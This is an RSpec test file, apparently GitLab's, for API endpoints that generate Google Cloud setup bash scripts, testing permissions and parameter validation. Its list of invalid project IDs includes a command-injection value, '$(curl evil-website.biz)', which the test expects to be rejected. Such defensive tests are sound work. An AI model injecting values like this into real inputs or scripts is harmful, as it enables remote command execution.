# frozen_string_literal: true

require 'spec_helper'

RSpec.describe API::ProjectGoogleCloudIntegration, feature_category: :system_access do
  let_it_be(:owner) { create(:user) }
  let_it_be(:group) { create(:group, :private, owners: owner) }
  let_it_be(:project) { create(:project, namespace: group) }

  let(:google_cloud_project_id) { 'google-cloud-project-id' }

  shared_examples 'an endpoint generating a bash script for Google Cloud' do
    it 'generates the script' do
      get(api(path, owner), params: params)

      expect(response).to have_gitlab_http_status(:ok)
      expect(response.content_type).to eql('text/plain')
      expect(response.body).to include("#!/bin/bash")
    end

    context 'when required param is missing' do
      let(:params) { {} }

      it 'returns error' do
        get(api(path, owner), params: params)

        expect(response).to have_gitlab_http_status(:bad_request)
      end
    end

    context 'when user do not have project admin access' do
      let_it_be(:user) { create(:user) }

      before_all do
        group.add_developer(user)
      end

      it 'returns error' do
        get(api(path, user), params: params)

        expect(response).to have_gitlab_http_status(:forbidden)
      end
    end
  end

  shared_examples 'does not return the shell script' do |invalid_param:|
    let(:invalid_google_project_ids) do
      [
        '$(curl evil-website.biz)',
        'abcd',
        'a' * 31,
        'my-project-',
        'Capital-Letters'
      ]
    end

    it do
      invalid_google_project_ids.each do |project_id|
        get(api(path, owner), params: {
          enable_google_cloud_artifact_registry: true,
          "#{invalid_param}": project_id
        })

        expect(response).to have_gitlab_http_status(:bad_request)
        expect(json_response['error']).to eq("#{invalid_param} is invalid")
      end
    end
  end

  describe 'GET /projects/:id/google_cloud/setup/runner_deployment_project.sh' do
    let(:path) { "/projects/#{project.id}/google_cloud/setup/runner_deployment_project.sh" }
    let(:params) do
      {
        google_cloud_project_id: google_cloud_project_id
      }
    end

    it 'returns 404' do
      get(api(path, owner), params: params)

      expect(response).to have_gitlab_http_status(:not_found)
    end

    context 'when SaaS feature is enabled' do
      before do
        stub_saas_features(google_cloud_support: true)
      end

      context 'when google_cloud_project_id is invalid' do
        it_behaves_like 'does not return the shell script', invalid_param: :google_cloud_project_id
      end

      it_behaves_like 'an endpoint generating a bash script for Google Cloud'

      it_behaves_like 'authorizing granular token permissions', :read_integration do
        let(:boundary_object) { project }
        let(:user) { owner }
        let(:request) { get api(path, personal_access_token: pat), params: params }
      end
    end
  end

  describe 'GET /projects/:id/google_cloud/setup/integrations.sh' do
    let(:path) { "/projects/#{project.id}/google_cloud/setup/integrations.sh" }
    let(:params) do
      { enable_google_cloud_artifact_registry: true,
        google_cloud_project_id: google_cloud_project_id }
    end

    it 'returns 404' do
      get(api(path, owner), params: params)

      expect(response).to have_gitlab_http_status(:not_found)
    end

    context 'when SaaS feature is enabled' do
      before do
        stub_saas_features(google_cloud_support: true)
      end

      context 'when Workload Identity Federation integration exists' do
        before do
          create(:google_cloud_platform_workload_identity_federation_integration, project: project)
        end

        context 'when google_cloud_artifact_registry_project_id is invalid' do
          it_behaves_like 'does not return the shell script', invalid_param: :google_cloud_artifact_registry_project_id
        end

        it_behaves_like 'an endpoint generating a bash script for Google Cloud'

        it_behaves_like 'authorizing granular token permissions', :read_integration do
          let(:boundary_object) { project }
          let(:user) { owner }
          let(:request) { get api(path, personal_access_token: pat), params: params }
        end
      end

      context 'when Workload Identity Federation integration does not exist' do
        it 'returns error' do
          get(api(path, owner), params: params)

          expect(response).to have_gitlab_http_status(:bad_request)
          expect(json_response['message']).to eq('Workload Identity Federation is not configured')
        end
      end
    end
  end
end
